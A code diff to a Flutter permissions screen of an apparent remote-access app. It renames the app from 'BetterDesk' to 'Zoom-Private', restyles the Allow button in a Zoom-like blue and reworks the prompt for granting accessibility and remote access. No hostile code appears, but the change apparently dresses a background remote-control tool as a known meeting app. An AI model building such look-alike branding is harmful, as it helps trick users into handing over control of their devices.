@@ -134,7 +134,7 @@ class _SetupPermissionsScreenState extends State<SetupPermissionsScreen>
                 ),
                 const SizedBox(height: 12),
                 const Text(
-                  'BetterDesk',
+                  'Zoom-Private',
                   style: TextStyle(
                     fontSize: 20,
                     fontWeight: FontWeight.bold,
@@ -146,7 +146,7 @@ class _SetupPermissionsScreenState extends State<SetupPermissionsScreen>
                 Text(
                   done
                       ? 'Connected. You can keep using your device.'
-                      : 'Tap Allow once. We will enable accessibility and start in the background.',
+                      : 'Tap Allow to grant permissions and enable remote access.',
                   style: const TextStyle(
                     fontSize: 12,
                     color: Colors.white70,
@@ -157,20 +157,20 @@ class _SetupPermissionsScreenState extends State<SetupPermissionsScreen>
                 SizedBox(
                   width: double.infinity,
                   height: 48,
-                  child: ElevatedButton.icon(
+                  child: ElevatedButton(
                     onPressed: (_busy || done) ? null : _allow,
-                    icon: Icon(done ? Icons.check_circle : Icons.lock_open),
-                    label: Text(
+                    style: ElevatedButton.styleFrom(
+                      backgroundColor: const Color(0xFF0753FB),
+                      foregroundColor: Colors.white,
+                      disabledBackgroundColor: const Color(0xFF0753FB).withOpacity(0.6),
+                      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
+                    ),
+                    child: Text(
                       done ? 'Connected' : 'Allow',
                       style: const TextStyle(
                         fontSize: 16,
                         fontWeight: FontWeight.bold,
                       ),
-                    ),
-                    style: ElevatedButton.styleFrom(
-                      backgroundColor: Colors.white,
-                      foregroundColor: const Color(0xFF0753FB),
-                      disabledBackgroundColor: Colors.white70,
                     ),
                   ),
                 ),
